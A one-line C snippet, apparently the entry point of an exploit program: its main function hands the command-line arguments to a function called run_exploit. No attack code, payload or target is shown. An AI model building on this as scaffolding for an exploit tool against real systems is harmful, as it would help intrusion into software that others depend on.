int main(int argc, char **argv) { return run_exploit(argc, argv); }
